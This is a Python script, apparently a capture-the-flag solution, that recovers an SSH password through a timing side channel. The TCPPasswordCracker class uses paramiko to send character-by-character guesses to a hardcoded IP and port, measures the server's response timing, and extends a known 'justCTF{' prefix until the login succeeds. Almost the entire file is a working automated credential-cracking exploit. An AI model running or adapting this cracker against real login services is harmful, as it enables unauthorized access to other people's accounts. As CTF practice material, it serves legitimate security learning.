import numpy as np
import os
import random
import paramiko.auth_strategy
import paramiko.ssh_exception
import socket
import string
import sys
import time
import paramiko
from datetime import datetime

def strip_time(text_str):
    return text_str[1:].split(']')[0]


def parse_datetime_to_microseconds(datetime_str):
    # Define the format of the datetime string
    datetime_format = "%Y-%m-%d %H:%M:%S.%f"
    
    # Parse the datetime string to a datetime object
    dt = datetime.strptime(datetime_str, datetime_format)
    
    # Convert the datetime object to a timestamp (seconds since epoch)
    timestamp_seconds = dt.timestamp()
    
    # Convert the timestamp to microseconds
    timestamp_microseconds = int(timestamp_seconds * 1_000_000)
    
    return timestamp_microseconds

class ServerDownError(Exception):
    def __init__(self, msg="Server is down, try again later.", *args, **kwargs):
        super().__init__(msg, *args, **kwargs)


class UnknownStepError(Exception):
    def __init__(self, msg="Did not find a suitable next character", *args, **kwargs):
        super().__init__(msg, *args, **kwargs)

class InteractiveAuthentication(paramiko.auth_strategy.AuthSource):
    def __init__(self, username, password_getter):
        super().__init__(username=username)
        self.password_getter = password_getter
        self.tries = 0
        self.times = [0, 10**18]

    def __repr__(self):
        # Password auth is marginally more 'username-caring' than pkeys, so may
        # as well log that info here.
        return super()._repr(user=self.username)

    def authenticate(self, transport):
        # Lazily get the password, in case it's prompting a user
        # TODO: be nice to log source _of_ the password?

        def handler(title, instructions, prompts):
            if self.tries > 3:
                raise paramiko.ssh_exception.AuthenticationException("more than enough here")
            if self.tries > 0:
                start = parse_datetime_to_microseconds(strip_time(title))
                end = parse_datetime_to_microseconds(strip_time(instructions))
                self.times.append(end - start)

            self.tries = self.tries + 1

            return [self.password_getter()]

        return transport.auth_interactive(self.username, handler)
    
    def cpu_times(self):
        # TODO do time difference from last auth attempt and return here
        return np.median(self.times)
    
N_RETRY = 3
N_PER_CHAR = 1
    
class TCPPasswordCracker:
    def __init__(self, host: str, port: int):
        self.server = (host, port)

    def timed_trial(self, server, password: str, timeout: int):
        authed = None
        times = None
        for try_nr in range(N_RETRY):  # max tries
            times = []
            for _ in range(N_PER_CHAR):
                try:
                    client = paramiko.client.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    auth = InteractiveAuthentication("ctf", lambda: password)
                    r = client.connect(
                        server[0],
                        port=server[1],
                        auth_strategy=auth,
                    )
                    try:
                        client.close()
                    except Exception:
                        pass
                    return 10**16, True
                        
                except paramiko.ssh_exception.AuthenticationException as e:
                    authed = False
                    print(f"AUTH FAILED {e}")
                    
                    try:
                        client.close()
                    except Exception:
                        print("Cannot close")
                        pass
                except (
                    socket.error,
                    socket.timeout,
                    paramiko.ssh_exception.NoValidConnectionsError,
                    paramiko.ssh_exception.SSHException,
                ):
                    print(f"Oof, timeout on try {try_nr}. Retrying", file=sys.stderr)
                    continue
                    
                times.append(auth.cpu_times())    
            print("time: ", np.min(times))
            return np.min(times), False

        # Fail, tries exceeded
        os._exit(0)

    def crack(self, prefix: str = ""):
        possible_chars = list("s1_cdhjlntuw{}CTF023456789")

        while True:
            baseline_timer = len(prefix)  # ~1s per correct char
            timing_ids, cracked_ids = [], []

            # For each possible character, send an attempt
            # We always add a trailing invalid character to
            # be able to tell when it does 'early stop',
            # as well as the "known good try" in case it's
            # the password already
            print("guessing what's after", prefix)
            guesses = [f"{prefix}{c}\n" for c in possible_chars] + [prefix]
            for guess in guesses:
                print("    ", guess)
                timing, cracked = self.timed_trial(
                    self.server, guess, baseline_timer + 3
                )
                timing_ids.append(timing)
                cracked_ids.append(cracked)

            print("Finished guessing.")

            # All of the attempts should be close to the baseline,
            # except for one, which should be ~1s higher. If the
            # average is lower than the baseline by a significant
            # margin, we did something wrong
            t = np.array(timing_ids)
            avg = np.average(t)
            #if baseline_timer - avg > 0.5:
            #    raise UnknownStepError

            # Search for any auth successful in case we already
            # figured out the password
            c = np.array(cracked_ids)
            solved = np.where(c == True)[0]
            if len(solved) == 1:
                return guesses[solved[0]]

            # There should be just one value ~1s higher than the
            # baseline. If there are several, this could be
            # a noisy run (e.g. bad network connectivity)
            #where = np.where(t > avg + 0.5)[0]
            #if len(where) != 1:
            #    print("Hmm, noisy run, let's try again")
            #    continue

            print("t = ", t)
            pos = np.argmax(t)
            print("pos: ", pos)
            timer, cracked, c = timing_ids[pos], cracked_ids[pos], possible_chars[pos]
            print("c = ", c)

            print("APPENDIX")
            if cracked:
                print("CRACKED!")
                return f"{prefix}{c}"
            else: # timer - baseline_timer > 0.85:
                print(f"Jackpot! Next is {c}")
                prefix = f"{prefix}{c}"
                print("APPENED")
                continue


if __name__ == "__main__":
    HOST = "206.81.21.179"
    PORT = 1337
    PREFIX = "justCTF{"  # if you know an initial part of the password, input it here

    print(
        f'Let\'s start cracking {HOST}:{PORT}! I know the password starts with "{PREFIX}"'
    )
    c = TCPPasswordCracker(HOST, PORT)
    solution = c.crack(PREFIX)
    print(f'Cracking complete, password is "{solution}"')
